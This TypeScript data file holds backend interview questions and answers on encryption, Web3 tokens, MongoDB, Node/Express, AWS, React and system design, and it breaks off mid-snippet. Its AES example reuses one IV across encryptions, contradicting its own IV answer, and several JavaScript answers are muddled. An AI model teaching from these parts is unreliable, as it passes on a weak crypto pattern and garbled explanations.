export interface Question {
    id: string;
    category: string;
    question: string;
    answer: string;
    snippet?: string;
}

export const interviewQuestions: Question[] = [
    // --- ENCRYPTION & SECURITY (AES-256, ECDH, JWT) ---
    {
        id: "sec-1",
        category: "Encryption & Security",
        question: "Explain how AES-256 symmetric encryption works.",
        answer: "AES-256 (Advanced Encryption Standard) is a symmetric encryption algorithm that uses a 256-bit key to encrypt and decrypt data in 128-bit blocks. 'Symmetric' means the same key is used for both encryption and decryption. It relies on a substitution-permutation network comprising 14 rounds of transformations.",
        snippet: "const crypto = require('crypto');\nconst algorithm = 'aes-256-cbc';\nconst key = crypto.randomBytes(32);\nconst iv = crypto.randomBytes(16);\n\nfunction encrypt(text) {\n  let cipher = crypto.createCipheriv(algorithm, Buffer.from(key), iv);\n  let encrypted = cipher.update(text);\n  encrypted = Buffer.concat([encrypted, cipher.final()]);\n  return { iv: iv.toString('hex'), encryptedData: encrypted.toString('hex') };\n}\n\nfunction decrypt(encryptedText, ivHex) {\n  let iv = Buffer.from(ivHex, 'hex');\n  let decipher = crypto.createDecipheriv(algorithm, Buffer.from(key), iv);\n  let decrypted = decipher.update(Buffer.from(encryptedText, 'hex'));\n  decrypted = Buffer.concat([decrypted, decipher.final()]);\n  return decrypted.toString();\n}"
    },
    {
        id: "sec-2",
        category: "Encryption & Security",
        question: "What is ECDH and how is it used for End-to-End Encryption (E2EE)?",
        answer: "ECDH (Elliptic Curve Diffie-Hellman) is an anonymous key agreement protocol. It allows two parties, each having an elliptic-curve public-private key pair, to establish a shared secret over an insecure channel. This shared secret is then typically used to derive a symmetric key (like AES-256) for encrypting the actual data.",
        snippet: "const crypto = require('crypto');\nconst alice = crypto.createECDH('secp256k1');\nalice.generateKeys();\nconst bob = crypto.createECDH('secp256k1');\nbob.generateKeys();\n\nconst aliceShared = alice.computeSecret(bob.getPublicKey());\nconst bobShared = bob.computeSecret(alice.getPublicKey());\n// aliceShared.toString('hex') === bobShared.toString('hex')"
    },
    {
        id: "sec-3",
        category: "Encryption & Security",
        question: "How do you securely store passwords in a Node.js backend?",
        answer: "Never store plaintext passwords. Use a strong, salted cryptographic hash function like bcrypt or Argon2. These algorithms are deliberately slow to perform, mitigating brute-force and dictionary attacks.",
        snippet: "const bcrypt = require('bcrypt');\nconst saltRounds = 10;\nconst plainPassword = 'mySecretPassword';\n\nbcrypt.hash(plainPassword, saltRounds, function(err, hash) {\n  // Store 'hash' in the database safely\n});"
    },
    {
        id: "sec-4",
        category: "Encryption & Security",
        question: "What is a JWT and what are its standard three parts?",
        answer: "JSON Web Token (JWT) is an open standard defining a compact way for securely transmitting information between parties as a JSON object. It consists of three parts separated by dots: Header, Payload (claims), and Signature."
    },
    {
        id: "sec-5",
        category: "Encryption & Security",
        question: "How would you implement Role-Based Access Control (RBAC) in Express?",
        answer: "Store user roles in the database (or JWT payload). Create an authentication middleware that verifies the JWT and attaches the user to the request. Then create an authorization middleware that checks if `req.user.role` matches the required role for the route.",
        snippet: "function authorize(roles = []) {\n  if (typeof roles === 'string') roles = [roles];\n  return [ \n    authenticateJWT,\n    (req, res, next) => {\n      if (!roles.length || roles.includes(req.user.role)) return next();\n      return res.status(403).json({ message: 'Forbidden' });\n    }\n  ];\n}"
    },
    {
        id: "sec-6",
        category: "Encryption & Security",
        question: "What is a side-channel attack and how does AES handle it?",
        answer: "Side-channel attacks exploit physical implementations (timing information, power consumption) rather than theoretical weaknesses. AES algorithms in modern environments (like Node.js `crypto` via OpenSSL) mitigate this by executing in constant time."
    },
    {
        id: "sec-7",
        category: "Encryption & Security",
        question: "Describe the process of Consent-Based Data Sharing.",
        answer: "In a consent-based system, User A encrypts their local data with a symmetric key. User A then encrypts the symmetric key using User B's public key (RSA/ECDH) and shares it. User B decrypts the symmetric key with their private key, then uses it to decrypt the requested data."
    },
    {
        id: "sec-8",
        category: "Encryption & Security",
        question: "What is the difference between AES-CBC and AES-GCM?",
        answer: "AES-CBC (Cipher Block Chaining) provides confidentiality but not integrity checking (requires a separate HMAC). AES-GCM (Galois/Counter Mode) provides Authenticated Encryption with Associated Data (AEAD), ensuring both confidentiality and data authenticity/integrity."
    },
    {
        id: "sec-9",
        category: "Encryption & Security",
        question: "Why do we need an IV (Initialization Vector) in AES?",
        answer: "The IV ensures that identical plaintexts encrypted with the same key will yield completely different ciphertexts. It prevents attackers from identifying patterns in encrypted data. It does not need to be secret but must be unique per encryption."
    },
    {
        id: "sec-10",
        category: "Encryption & Security",
        question: "How do you protect a REST API from brute-force login attacks?",
        answer: "Implement rate limiting using packages like `express-rate-limit`, implement account lockouts after a certain number of failed attempts within a time window, and enforce robust password complexity rules."
    },

    // --- WEB3 & BLOCKCHAIN (ERC-20, ERC-721) ---
    {
        id: "web3-1",
        category: "Web3 & Blockchain",
        question: "What is an ERC-20 token and standard?",
        answer: "ERC-20 is the standard for creating fungible tokens on the Ethereum blockchain. It specifies six mandatory functions: totalSupply, balanceOf, transfer, transferFrom, approve, and allowance."
    },
    {
        id: "web3-2",
        category: "Web3 & Blockchain",
        question: "What is an ERC-721 token and how does it differ from ERC-20?",
        answer: "ERC-721 is the standard for Non-Fungible Tokens (NFTs). Unlike ERC-20 where tokens are identical (fungible), each ERC-721 token is completely unique. It implements functions like ownerOf(tokenId) and safeTransferFrom()."
    },
    {
        id: "web3-3",
        category: "Web3 & Blockchain",
        question: "How do you interact with a smart contract from a Node.js backend?",
        answer: "Usually via the highly popular `ethers.js` or `web3.js` libraries. You need to connect to an RPC node (like Infura or Alchemy), initiate a Provider and a connected Wallet/Signer, and pass the contract's ABI and Address.",
        snippet: "const { ethers } = require('ethers');\nconst provider = new ethers.JsonRpcProvider('https://mainnet.infura.io/v3/YOUR-API-KEY');\nconst wallet = new ethers.Wallet(privateKey, provider);\nconst contract = new ethers.Contract(contractAddress, abi, wallet);\nconst tx = await contract.mint(wallet.address, 1);"
    },
    {
        id: "web3-4",
        category: "Web3 & Blockchain",
        question: "Explain the concept of Web3 'gas'.",
        answer: "Gas refers to the fee required to successfully conduct a transaction or execute a contract on Ethereum. It acts as a computational cost limit (Gas Limit) paired with a price per unit (Gas Price in gwei)."
    },
    {
        id: "web3-5",
        category: "Web3 & Blockchain",
        question: "What happens if a backend token transaction fails and mining stops?",
        answer: "Transactions can fail for various reasons (out of gas, reverted conditions). In Node backend implementations, you must wrap network calls in `try/catch` handlers and track transaction receipts. If reverted, the gas is spent, but state changes are rolled back."
    },
    {
        id: "web3-6",
        category: "Web3 & Blockchain",
        question: "What is the difference between minting and transferring an ERC-721?",
        answer: "Minting is the creation of a brand new, unique token on the blockchain out of nothing (assigning mapping from address(0) to User). Transferring implies pulling an existing token from the possession of User A and distributing to User B."
    },
    {
        id: "web3-7",
        category: "Web3 & Blockchain",
        question: "How does the 'approve' and 'transferFrom' flow work in ERC-20?",
        answer: "The token holder calls `approve(spenderAddress, amount)` to allow a third-party smart contract or user (the spender) to withdraw up to the `amount` from their wallet. The spender then calls `transferFrom(owner, recipient, amount)`."
    },
    {
        id: "web3-8",
        category: "Web3 & Blockchain",
        question: "What are some ways to secure private keys in a Node.js production backend?",
        answer: "Never hardcode private keys. Use cloud-based Secrets Management platforms (like AWS KMS, AWS Secrets Manager, HashiCorp Vault). Use HSM (Hardware Security Modules) for high-value applications. Avoid committing `.env` files."
    },
    {
        id: "web3-9",
        category: "Web3 & Blockchain",
        question: "What is an RPC node?",
        answer: "A Remote Procedure Call (RPC) node is an interface that allows an external application (like a Node server) to interact with the blockchain data to read state or broadcast signed transactions."
    },
    {
        id: "web3-10",
        category: "Web3 & Blockchain",
        question: "Explain Real Estate Tokenization on the Blockchain.",
        answer: "Real estate tokenization involves digitizing fractional ownership of a physical property using a smart contract. An LLC holds the deed, and tokens (ERC-20) are issued representing shares of that LLC. This improves liquidity and lowers entry barriers."
    },

    // --- MONGODB & DATABASES ---
    {
        id: "db-1",
        category: "Database Systems",
        question: "Explain what an Aggregation Pipeline is and provide an example of a single-collection aggregation.",
        answer: "The aggregation pipeline is a framework for data aggregation modeled on the concept of data processing pipelines. Documents enter a multi-stage pipeline that transforms them into an aggregated result. Prominent stages include $match, $group, $sort, and $project.",
        snippet: `// Example: Calculate total sales per customer for active orders in a single 'orders' collection
db.orders.aggregate([
  // Stage 1: Filter documents to only include 'active' orders
  { $match: { status: 'active' } },
  
  // Stage 2: Group by customer ID and calculate the sum of the 'amount' field
  { 
    $group: { 
      _id: '$cust_id', // Grouping key (groups by cust_id)
      totalPurchases: { $sum: '$amount' } // Accumulator calculating total
    } 
  },
  
  // Stage 3: Sort the resulting grouped documents by total purchases in descending order (highest first)
  { $sort: { totalPurchases: -1 } }
]);`
    },
    {
        id: "db-8",
        category: "Database Systems",
        question: "What is the $lookup stage in aggregation? Provide an example of multi-collection aggregation.",
        answer: "$lookup performs a left outer join to a different collection in the same database to filter in documents from the joined collection for processing. It effectively simulates relational database JOIN behavior.",
        snippet: `// Example: Join 'orders' with 'products' collection to get detailed product info for each order
db.orders.aggregate([
  // Stage 1: Join with the products collection
  {
    $lookup: {
      from: 'products',           // The target collection to join
      localField: 'productId',    // The field from the input document ('orders')
      foreignField: '_id',        // The matched field from the documents of the 'products' collection
      as: 'productDetails'        // The new array field added to the output document
    }
  },
  // Stage 2: Unwind the resulting array to turn it into a flat object 
  // (Assuming each order corresponds to one product, mapping 1-to-1)
  {
    $unwind: {
      path: '$productDetails',
      preserveNullAndEmptyArrays: true // Keep orders in the pipeline even if they have no matching product
    }
  }
]);`
    },
    {
        id: "db-3",
        category: "Database Systems",
        question: "What is indexing in database systems and how do you create different types of indexes in MongoDB?",
        answer: "An index is a strictly ordered data structure that speeds up data retrieval operations. Without an index, the engine must perform a 'collscan' (scanning every document). An index structures the searched-upon field to allow O(log n) lookups.",
        snippet: `// 1. Single Field Index: Speeds up queries on a single specific field
// '1' indicates ascending order layout, '-1' indicates descending
db.users.createIndex({ email: 1 }); 

// 2. Compound Index: Optimizes queries that filter or sort on multiple fields combined
// E.g., heavily speeding up queries checking both lastName and firstName
db.employees.createIndex({ lastName: 1, firstName: 1 });

// 3. Unique Index: Ensures no two documents have the exact same value for the indexed field (like Usernames)
db.users.createIndex({ username: 1 }, { unique: true });

// 4. Text Index: Supports contextual text search queries mapped over large string content
db.articles.createIndex({ title: "text", content: "text" });`
    },
    {
        id: "db-11",
        category: "Database Systems",
        question: "How do you implement efficient pagination in a Node.js/MongoDB backend for massive datasets?",
        answer: "Pagination can be implemented using skip/limit or cursor-based pagination. Cursor-based (pointer) is significantly faster for millions of records because it avoids traversing matching documents continuously up to the skip value.",
        snippet: `// Approach 1: Offset-based Pagination (skip and limit)
// Simple to read, but VERY slow for large datasets as it must scan and skip previous elements
const pageSize = 20;
const pageNumber = 5;
const offsetPagi = await db.collection('posts')
  .find({ status: 'published' })
  .sort({ createdAt: -1 }) // Sort by newest
  .skip((pageNumber - 1) * pageSize) // Skip the first 80 records
  .limit(pageSize) // Return next 20
  .toArray();

// Approach 2: Cursor-based Pagination (Fast & Strongly Recommended for 1M+ Records)
// Requires explicitly passing the last seen _id from the frontend from the previous page
const lastSeenId = "60c72b2f9b1e8a3b4c1a2b3c"; 
const cursorPagi = await db.collection('posts')
  // Fetch items exclusively occurring BEFORE the last seen document ID in the database index tree
  .find({ status: 'published', _id: { $lt: ObjectId(lastSeenId) } }) 
  .sort({ _id: -1 })
  .limit(pageSize)
  .toArray();`
    },
    {
        id: "db-2",
        category: "Database Systems",
        question: "How does a Vector Database / MongoDB Vector Search work?",
        answer: "Instead of comparing exact strings, Vector databases map data inputs (text, images) into a high-dimensional mathematical space (embeddings). Similar concepts are placed near each other. MongoDB Atlas Vector Search uses Approximate Nearest Neighbor algorithms (like HNSW) to run sematic searches quickly."
    },
    {
        id: "db-4",
        category: "Database Systems",
        question: "How do you handle migration of 5M+ records in MongoDB without crashing the server?",
        answer: "Never use standard \`.find().toArray()\` for 5 million records; it will OOM (Out of Memory) crash Node.js. Use a highly targeted \`.find().cursor()\` to stream records in batches, processing documents via multi-threaded worker pools, and utilize bulk-write operations like \`.bulkWrite()\` to minimize network overhead."
    },
    {
        id: "db-6",
        category: "Database Systems",
        question: "What are MongoDB Triggers and how did you use them?",
        answer: "Atlas Triggers are serverless functions hosted purely on the DB cluster. They execute in response to database changes (inserts, updates). They're highly effective for auto-syncing secondary collections or reaching out to Third-Party services instantaneously."
    },
    {
        id: "db-7",
        category: "Database Systems",
        question: "Explain Mongoose Middleware (Pre and Post hooks).",
        answer: "Mongoose middleware are functions passed control during execution of asynchronous operations. A common use-case for a \`pre('save')\` hook is hashing a user's password before sending it to the database.",
        snippet: `userSchema.pre('save', async function(next) {\n  // If the password wasn't modified in this request, skip encryption\n  if(!this.isModified('password')) return next();\n  \n  // Execute high-density bcrypt hash on the plaintext password mapped in state\n  this.password = await bcrypt.hash(this.password, 10);\n  next();\n});`
    },
    {
        id: "db-9",
        category: "Database Systems",
        question: "How do you prevent a dirty read in backend data migrations?",
        answer: "In MongoDB, handle critical multi-document operations inside a Transaction Session. You initiate a transaction, perform writes, and if anything errors, call \`session.abortTransaction()\`."
    },

    // --- NODE.JS, EXPRESS, & ARCHITECTURE ---
    {
        id: "backend-1",
        category: "Node.js & express",
        question: "Explain the Node.js Event Loop.",
        answer: "The Event Loop dictates how Node executes asynchronous operations. Since JS is single-threaded, the Event Loop assigns tasks to the OS kernel. Upon resolution, callbacks are sent to the task queue. Phases include Timers, Pending Callbacks, Poll, Check, and Close callbacks."
    },
    {
        id: "backend-2",
        category: "Node.js & express",
        question: "What is Middleware in Express.js?",
        answer: "Middleware functions are functions acting as links within the Express life cycle router. They have access to the request object (req), the response object (res), and the next middleware function."
    },
    {
        id: "backend-3",
        category: "Node.js & express",
        question: "How do you handle unhandled promise rejections internally in Node?",
        answer: "Use `process.on('unhandledRejection', callback)`. However, it's best practice to attach a `.catch()` block to every promise or utilize `try/catch` within generic `async` functions to intercept errors at their origin source."
    },
    {
        id: "backend-4",
        category: "Node.js & express",
        question: "Describe your strategy for building a Real-Time Chat System.",
        answer: "I utilize WebSockets (via Socket.io). The frontend establishes a persistent stateful socket connection to the Node.js backend server. The server tracks online user states via connection IDs in memory/Redis and emits broadcast events (like 'new_message') immediately to associated room pools."
    },
    {
        id: "backend-5",
        category: "Node.js & express",
        question: "What are the common HTTP methods used in REST?",
        answer: "GET (Retrieve resource), POST (Create resource), PUT (Replace resource), PATCH (Update partial resource), and DELETE (Remove resource)."
    },
    {
        id: "backend-6",
        category: "Node.js & express",
        question: "Explain the MVC Pattern.",
        answer: "Model-View-Controller. Models handle data representation and DB logic. Controllers handle routing, request interception, and orchestrating models. Views handle the UI presentation."
    },
    {
        id: "backend-7",
        category: "Node.js & express",
        question: "How do you handle file uploads in an Express backend?",
        answer: "Using a `multipart/form-data` parser middleware like `multer`. Multer intercepts the data stream buffer, allowing you to intercept and save files to disks or upload directly to an AWS S3 bucket pipeline."
    },
    {
        id: "backend-8",
        category: "Node.js & express",
        question: "What's the difference between `res.send()` and `res.json()`?",
        answer: "`res.send()` automatically parses its arguments natively determining headers. `res.json()` strictly forces header formatting and stringification representing JSON data."
    },
    {
        id: "backend-9",
        category: "Node.js & express",
        question: "How do you scale a Node application vertically vs horizontally?",
        answer: "Vertical scaling increases identical single-machine resources (RAM, CPU). Horizontal scaling duplicates the server entirely behind a load balancer (such as NGINX or AWS ALB)."
    },
    {
        id: "backend-10",
        category: "Node.js & express",
        question: "What is the purpose of `package-lock.json`?",
        answer: "It locks down the strictly requested version dependencies and sub-dependencies. This ensures identical environments across team setups avoiding 'works on my machine' errors triggered by minor dependency package patches."
    },

    // --- AWS, CLOUD & SERVERLESS ---
    {
        id: "aws-1",
        category: "Cloud & Deployment",
        question: "What is AWS Lambda and what does \"Serverless\" truly mean?",
        answer: "Serverless doesn't actually mean no servers; it means the server infrastructure logic is abstracted away entirely by AWS. Lambda runs execution functions triggered by events, instantly scaling and charging purely on execution time rather than persistent up-time."
    },
    {
        id: "aws-2",
        category: "Cloud & Deployment",
        question: "Explain AWS API Gateway integration with Lambda.",
        answer: "API Gateway acts as the heavily protective HTTP front door. It receives the REST API hits and natively routes the HTTP payload internally to AWS Lambda as an `event` JSON object for computational execution."
    },
    {
        id: "aws-3",
        category: "Cloud & Deployment",
        question: "How does AWS S3 differ from standard Block Storage (EBS)?",
        answer: "S3 is object storage over HTTP using buckets. It's wildly scalable, generally cheaper, and great for static assets, backups, and user uploads. EBS is block storage practically serving as the hard drive running attached to an EC2 instance."
    },
    {
        id: "aws-4",
        category: "Cloud & Deployment",
        question: "How is Vercel different compared to manual EC2 orchestration?",
        answer: "Vercel abstracts the pipeline. Next.js natively builds Serverless APIs and edge-network caching CDN protocols via Git-Ops pushes. Manual EC2 requires manually configuring the OS, bash script deployments, Load Balancers, SSL generation, and instance scaling."
    },
    {
        id: "aws-5",
        category: "Cloud & Deployment",
        question: "What happens during a cold start on Serverless functions?",
        answer: "If a serverless function hasn't been engaged recently, the cloud provider will tear down the idle container to save resources. A fresh request requires allocating entirely new container space, installing dependencies, and spinning up the Node instance resulting in a 'cold start' processing delay."
    },
    {
        id: "aws-6",
        category: "Cloud & Deployment",
        question: "How does Firebase Authentication differ from local JWT execution?",
        answer: "Firebase handles password encryption hashing, salts, social login protocols, and state-token management totally off-site. The backend just verifies the ID Token legitimacy via the Firebase Admin SDK eliminating security liability for local storage."
    },
    {
        id: "aws-7",
        category: "Cloud & Deployment",
        question: "What are AWS IAM roles and policies?",
        answer: "Identity and Access Management permissions. Hard rules strictly explicitly allowing or denying programmatic AWS user scripts and internal Services the authority to access specified AWS resources."
    },
    {
        id: "aws-8",
        category: "Cloud & Deployment",
        question: "Why would you decouple a system with Webhook events?",
        answer: "Decoupling shifts intensive asynchronous processes (like firing AI integration responses or finalizing massive file formats) away from the HTTP main-thread, allowing the user's view context to rapidly unblock and receive Webhook confirmation out-of-band."
    },
    {
        id: "aws-9",
        category: "Cloud & Deployment",
        question: "What are the common strategies for loading `.env` variables in production?",
        answer: "For EC2, injecting directly into the PM2 or systemd environment wrapper. For Docker/Kubernetes, via cluster secret injection. For Serverless, loading via AWS strictly-guarded System Manager parameters directly resolving upon initialization."
    },
    {
        id: "aws-10",
        category: "Cloud & Deployment",
        question: "Describe your deployment workflow.",
        answer: "I focus primarily on GitOps triggers utilizing GitHub branching directly merged into the Vercel architecture pipeline (for Next.js frontend/APIs) and heavily utilizing automated CI/CD for standalone Node instances to streamline production staging tests before merge."
    },

    // --- ADVANCED JAVASCRIPT, REACT & NEXT.JS ---
    {
        id: "js-1",
        category: "Advanced JavaScript & Next.js",
        question: "What is Hoisting in JavaScript?",
        answer: "Hoisting is the default behavior moving declaration definitions up to the top of the current scope. However, `let` and `const` keywords implement a Temporal Dead Zone preventing them from being accessed before initialization."
    },
    {
        id: "js-2",
        category: "Advanced JavaScript & Next.js",
        question: "Explain Closures simply.",
        answer: "A closure fundamentally occurs when an inner function continues to have explicit access to variables contained in its outer enclosing function, even completely after that outer scope execution function has terminated."
    },
    {
        id: "js-3",
        category: "Advanced JavaScript & Next.js",
        question: "Differentiate between Call, Apply, and Bind.",
        answer: "\`call()\` attaches execution with explicit separated arguments context. \`apply()\` acts functionally identical but demands array arguments. \`bind()\` does absolutely not execute; it returns a completely new permanently context-locked function representation.",
        snippet: `const user = { name: "Alice", role: "Admin" };

function greet(greeting, punctuation) {
  // 'this' refers to whichever object is passed as the first argument
  return \`\${greeting}, \${this.name} [\${this.role}]\${punctuation}\`;
}

// 1. call() - Invokes immediately. Pass arguments individually separated by commas.
// Useful when you know the exact number of arguments beforehand.
console.log(greet.call(user, "Hello", "!")); 
// Output: "Hello, Alice [Admin]!"

// 2. apply() - Invokes immediately. Pass arguments strictly as a single Array.
// Crucial when you have an array of data, like mapping over Math.max.apply(null, [1,2,3])
console.log(greet.apply(user, ["Welcome", "."])); 
// Output: "Welcome, Alice [Admin]."

// 3. bind() - Does NOT invoke immediately. It returns a brand-new function.
// The new function is permanently 'locked' to the 'user' context.
// Extremely common in React for passing callbacks down to children to preserve 'this'.
const lockedGreeting = greet.bind(user, "Hey");
console.log(lockedGreeting("?")); 
// Output: "Hey, Alice [Admin]?"`
    },
    {
        id: "js-4",
        category: "Advanced JavaScript & Next.js",
        question: "What are the core differences between Client Components and Server Components in Next.js App Router?",
        answer: "Server Components (default) are strictly executed entirely on the Node backend allowing direct un-exposed Database API reads saving massive JS bundle size. Client components (`\"use client\"`) retain hydration instructions natively supporting user `onClick` activity and React `useStates` hooks."
    },
    {
        id: "js-5",
        category: "Advanced JavaScript & Next.js",
        question: "Explain the Virtual DOM in React.",
        answer: "Direct heavy DOM node manipulation acts incredibly computationally expensive to UI processors. React stores a structural lightweight JavaScript copy representations (Virtual DOM). Upon state adjustment it creates a strict 'diff' and explicitly batches only those resulting node changes strictly into the true browser layout."
    },
    {
        id: "js-6",
        category: "Advanced JavaScript & Next.js",
        question: "What is the purpose of React's `useEffect` Dependency Array?",
        answer: "It manages the lifecycle condition triggers. Empty `[]` guarantees single fire upon immediate hydration. An array populated completely dictates React strictly executes the enclosed payload specifically if variables inside mutate."
    },
    {
        id: "js-7",
        category: "Advanced JavaScript & Next.js",
        question: "What is Next.js API Routes structure?",
        answer: "Next.js naturally implements REST logic natively within routing context structure enabling independent serverless APIs natively inside `src/app/api/route.ts` bypassing entirely distinct Node.js Express server layers."
    },
    {
        id: "js-8",
        category: "Advanced JavaScript & Next.js",
        question: "Explain destructuring assignments.",
        answer: "A deeply embedded JavaScript syntax extracting rapid individual properties locally from objects and arrays strictly assigning mapping identical structures into precise variable pointers.",
        snippet: `// --- Object Destructuring ---
const user = { 
  id: 42, 
  profile: { name: 'John Doe', age: 30 },
  role: 'Developer'
};

// Extracting strictly named properties into variables
const { id, role } = user;
console.log(id, role); // 42 "Developer"

// Deep destructuring (extracting nested properties)
const { profile: { name } } = user;
console.log(name); // "John Doe"

// Assigning to new variable names (e.g., extracting 'id' but calling it 'userId')
const { id: userId } = user;
console.log(userId); // 42

// --- Array Destructuring ---
const coordinates = [10.5, 20.3, 30.1];

// Extracting ordered elements by position
const [x, y] = coordinates;
console.log(x, y); // 10.5 20.3

// Using the Rest operator to grab remaining elements
const [first, ...rest] = coordinates;
console.log(rest); // [20.3, 30.1]

// Skipping elements with empty commas
const [, , z] = coordinates;
console.log(z); // 30.1`
    },
    {
        id: "js-9",
        category: "Advanced JavaScript & Next.js",
        question: "Explain Prototypal Inheritance vs ES6 Classes.",
        answer: "JS operates basically natively object-assigned mapping references extending `Object.prototype` contexts. ES6 classes primarily behave exactly inherently as syntactic protective sugar visually standardizing inheritance structural architecture over JavaScript prototypes."
    },
    {
        id: "js-10",
        category: "Advanced JavaScript & Next.js",
        question: "How does the React Context API resolve Prop Drilling?",
        answer: "Prop Drilling involves repeatedly piping data down infinitely through completely unconnected parent hierarchy mapping. The Context API functionally teleports state directly enabling structural data utilization instantly everywhere completely detaching explicitly chained hierarchy definitions."
    },
    {
        id: "js-11",
        category: "Advanced JavaScript & Next.js",
        question: "What is function currying?",
        answer: "Currying transforms a function that takes multiple arguments into a series of unary functions (each taking one argument). It enables partial application — you can pre-fill some arguments and reuse the resulting specialized function.",
        snippet: `// --- 1. ES6 Arrow Function Currying ---
const add = a => b => a + b;

// Partial application: creating a specialized function
const add5 = add(5); 

console.log(add5(3));  // 8
console.log(add5(10)); // 15

// Or calling it immediately with both arguments
console.log(add(10)(20)); // 30

// --- 2. Normal Function Declaration Equivalent ---
// This behaves identically to the arrow function above but shows the scoping explicitly.
function normalAdd(a) {
  // 'a' is preserved in the closure for the returning function
  return function(b) {
    return a + b;
  };
}

const normalAdd5 = normalAdd(5);
console.log(normalAdd5(7)); // 12`
    },

    // --- SYSTEM DESIGN ---
    {
        id: "sys-1",
        category: "System Design",
        question: "Explain Scalability Basics.",
        answer: "Scalability is the property of a system to handle a growing amount of work by adding resources to the system. A system is scalable if its performance improves proportionally with the added capacity.",
        snippet: `// Handwritten notes:
// Goals of Scalability:
// 1. Handle increased load (traffic/data).
// 2. Maintain or improve latency (speed).
// 3. Ensure high availability (avoid single point of failure).

// Basic Concept:
// [User] --> [App Server] (Bottleneck!)
//           /        \\
//   [Scaling Up]   [Scaling Out]
//   (Better CPU)    (More Servers)`
    },
    {
        id: "sys-2",
        category: "System Design",
        question: "What is the difference between Horizontal vs Vertical Scaling?",
        answer: "Vertical Scaling (Scaling Up) means adding more hardware power (CPU, RAM, SSD) to an existing machine. Horizontal Scaling (Scaling Out) means adding more machines/nodes into your pool of resources.",
        snippet: `// Vertical Scaling (Scale Up)
// [ Server (2GB) ] ---> [ Server (16GB) ]
// * Pros: Simple to implement, no code changes needed.
// * Cons: Hard hardware limit, single point of failure (SPOF), downtime during upgrade.

// Horizontal Scaling (Scale Out)
// [ Server ] ---> [ Server 1 ] + [ Server 2 ] + [ Server 3 ]
// * Pros: Infinite scaling, resilient to node failures (no SPOF).
// * Cons: Complex architecture, requires load balancer, data consistency is challenging.`
    },
    {
        id: "sys-3",
        category: "System Design",
        question: "Explain Load Balancing and its common algorithms (Round Robin, Least Connections).",
        answer: "A Load Balancer acts as a \"traffic cop\" sitting in front of your servers, routing client requests across all servers to ensure no single server bears too much demand, thus improving responsiveness and availability.",
        snippet: `// Load Balancer Flowchart:
//                [Client 1]  [Client 2]  [Client 3]
//                     \\          |          /
//                      v          v          v
//                   (   Load Balancer (Nginx/ALB)   )
//                      /          |          \\
//                     v           v           v
//             [Server A]     [Server B]     [Server C]

// Algorithms:
// 1. Round Robin: Distributes requests sequentially.
//    (Req 1 -> A, Req 2 -> B, Req 3 -> C, Req 4 -> A...)
//    Ideal for: Servers with identical specs and similar requested task loads.

// 2. Least Connections: Sends request to the server with the fewest active connections.
//    Ideal for: Apps with long-lived connections (e.g. Chat sockets) or variable-time requests.`
    },
    {
        id: "sys-4",
        category: "System Design",
        question: "What are Stateless vs Stateful services?",
        answer: "Stateless services treat each request as completely independent; no session data is stored locally on the server between requests. Stateful services store session state locally across multiple requests from the same client.",
        snippet: `// ❌ Stateful Architecture (Hard to Scale Horizontally)
// 1. User logs into Server A -> Server A stores { User: Active } in local RAM.
// 2. User makes request, Load Balancer routes to Server B.
// 3. Server B doesn't know User -> User logged out!
// Fix: Requires "Sticky Sessions" at LB level.

// ✅ Stateless Architecture (Ideal for Scaling)
// 1. User logs in -> Backend signs a JWT (JSON Web Token) and sends it to Client.
// 2. User sends request to Server B with JWT in Header.
// 3. Server B validates JWT mathmatically -> User is Auth'd! No local state needed.
// Fix: Can scale to infinite nodes instantly.

// If State is required (e.g. Cart, live matches), use external centralized state:
// [Servers A, B, C] <---> [ Redis Cache Shared Cluster ]`
    },
    {
        id: "sys-5",
        category: "System Design",
        question: "Explain Cache Locations (Client, CDN, Server, Database).",
        answer: "Caching stores copies of frequently accessed data in a fast-retrieval layer (like RAM). Caching can be implemented at multiple levels: Client (Browser cache), CDN (Edge servers for static assets), Server (Redis/Memcached for API responses), and Database (Internal DB memory buffer).",
        snippet: `// Caching Layers Architecture:
//
// 1. [ Client / Browser ] -> Caches images, CSS, JS natively.
//          |
//          v
// 2. [    CDN (Cloudflare)    ] -> Caches static assets globally at Edge.
//          |
//          v
// 3. [ App Server (Node.js) ] -> Caches API calculations/DB results.
//          |   \\______________________
//          |                          v
//          v                 [ Redis Server Cache ]
// 4. [ Database (MongoDB) ] -> Internal buffer cache for reads.`
    },
    {
        id: "sys-6",
        category: "System Design",
        question: "Explain common Cache Invalidation Strategies (Write-through, Write-around, Write-back).",
        answer: "Invalidation ensures stale data is removed from the cache. Write-Through writes to cache and DB simultaneously (safe, but slow writes). Write-Around writes directly to the DB, bypassing cache (cache updated on next read). Write-Back writes ONLY to cache, syncing to DB asynchronously later (fastest writes, high risk of data loss).",
        snippet: `// Invalidation Strategy Flow:

// --- Write-Through ---
// App -> writes to -> [Cache] -> synchronously writes to -> [Database]
// Pros: High data consistency. Cons: Higher write latency.

// --- Write-Around ---
// App -> writes to -> [Database] (Cache is bypassed)
// App -> reads from -> [Cache] (MISS) -> reads from -> [Database] -> updates [Cache]
// Pros: Cache isn't flooded with data that isn't read immediately. 

// --- Write-Back (Write-Behind) ---
// App -> writes to -> [Cache] (ACK sent immediately to App)
// [Cache] -> asynchronously writes to -> [Database]
// Pros: Extremely low write latency. Cons: If Cache node dies before sync, data is completely lost.`
    },
    {
        id: "sys-7",
        category: "System Design",
        question: "What are Cache Eviction Policies? Detail LRU vs LFU.",
        answer: "When a cache (RAM) fills up, it must evict old items. LRU (Least Recently Used) removes data that hasn't been accessed for the longest time. LFU (Least Frequently Used) removes data that has the lowest total access count over time.",
        snippet: `// --- LRU (Least Recently Used) ---
// Triggers eviction based on TIME of last access.
// Cache Limit: 3 items.
// Insert A, B, C -> Cache: [C, B, A] (Most recent first)
// Read A         -> Cache: [A, C, B] (A moves to front)
// Insert D       -> Cache: [D, A, C] (B is evicted because it's oldest)

// --- LFU (Least Frequently Used) ---
// Triggers eviction based on TOTAL COUNT of accesses.
// Cache:
// Item A (Accessed 100 times)
// Item B (Accessed 50 times)
// Item C (Accessed 2 times)
// If Cache is full and 'D' is added, 'C' is evicted regardless of when 'C' was last read.`
    },
    {
        id: "sys-8",
        category: "System Design",
        question: "What is the difference between Redis and Memcached?",
        answer: "Memcached is strictly an in-memory key-value store optimized for simple, fast caching of short strings/objects. Redis is an in-memory data structure store that supports complex types (Lists, Sets, Hashes) and offers disk persistence (snapshots) ensuring data survives a server reboot. Memcached is volatile (data wiped on restart).",
        snippet: `// Key Differences:
// 
// Feature          | Memcached                  | Redis
// -----------------|----------------------------|------------------------
// Data Types       | Strings only               | Strings, Hashes, Lists, Sets
